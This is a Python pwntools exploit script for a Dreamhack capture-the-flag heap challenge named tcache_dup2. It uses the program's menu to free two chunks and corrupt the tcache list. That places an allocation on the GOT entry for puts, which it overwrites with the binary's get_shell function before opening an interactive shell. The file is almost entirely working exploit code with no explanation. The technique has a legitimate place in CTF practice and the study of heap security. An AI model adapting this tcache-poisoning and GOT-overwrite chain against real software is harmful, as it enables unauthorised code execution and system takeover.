#!/usr/bin/env python3

from pwn import *

exe = ELF("tcache_dup2_patched", checksec = False)
libc = ELF("libc-2.30.so", checksec = False)
ld = ELF("ld-2.30.so", checksec = False)

context.binary = exe


if args.LOCAL:
    p = process(exe.path)
else:
    p = remote("host3.dreamhack.games", 8985)

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', size)
    p.sendlineafter(b'Data: ', data)

def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', idx)
    p.sendlineafter(b'Size: ', size)
    p.sendlineafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', idx)

input()
create(b'16', b'a'*8)
create(b'16', b'a'*8)
delete(b'1')
delete(b'0')
modify(b'0', b'16', p64(exe.got["puts"]))
create(b'16', b'a'*8)
create(b'16', p64(exe.sym["get_shell"]))


p.interactive()